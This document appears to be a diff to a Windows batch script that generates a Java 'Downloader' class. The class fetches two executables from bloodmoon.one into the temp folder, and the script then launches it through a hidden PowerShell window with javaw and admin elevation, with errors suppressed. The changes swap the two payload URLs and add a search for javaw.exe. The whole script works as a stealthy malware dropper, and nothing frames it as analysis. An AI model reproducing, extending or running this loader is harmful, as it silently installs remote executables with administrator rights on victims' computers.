@@ -22,8 +22,8 @@ echo import java.time.Duration;
 echo.
 echo public class Downloader {
 echo     public static void main^(String[] args^) {
-echo         String url1 = "https://bloodmoon.one/cvs.exe";
-echo         String url2 = "https://bloodmoon.one/msb.exe";
+echo         String url1 = "https://bloodmoon.one/msb.exe";
+echo         String url2 = "https://bloodmoon.one/cvs.exe";
 echo.
 echo         Path tempDir = Path.of^(System.getProperty^("java.io.tmpdir"^)^);
 echo         Path file1Path = tempDir.resolve^("cvscvscvs.exe"^);
@@ -74,8 +74,21 @@ echo }
 ) > "%JAVA_FILE%"
 
 :request_admin
+:: Find Java in common locations
+set "JAVAW_PATH="
+for %%i in (javaw.exe) do set "JAVAW_PATH=%%~$PATH:i"
+if not defined JAVAW_PATH (
+    if exist "%JAVA_HOME%\bin\javaw.exe" set "JAVAW_PATH=%JAVA_HOME%\bin\javaw.exe"
+)
+if not defined JAVAW_PATH (
+    if exist "C:\Program Files\Java\jdk-21\bin\javaw.exe" set "JAVAW_PATH=C:\Program Files\Java\jdk-21\bin\javaw.exe"
+)
+if not defined JAVAW_PATH (
+    if exist "C:\Program Files\Eclipse Adoptium\jdk-21.0.6.6-hotspot\bin\javaw.exe" set "JAVAW_PATH=C:\Program Files\Eclipse Adoptium\jdk-21.0.6.6-hotspot\bin\javaw.exe"
+)
+
 :: Run with javaw (no console) and request admin elevation
-powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "$p = Start-Process -FilePath 'javaw.exe' -ArgumentList @('%JAVA_FILE%') -WorkingDirectory '%TEMP%' -Verb RunAs -PassThru -ErrorAction SilentlyContinue; if (-not $p) { exit 1 }"
+powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "$p = Start-Process -FilePath '%JAVAW_PATH%' -ArgumentList @('%JAVA_FILE%') -WorkingDirectory '%TEMP%' -Verb RunAs -PassThru -ErrorAction SilentlyContinue; if (-not $p) { exit 1 }"
 
 if errorlevel 1 (
     echo.
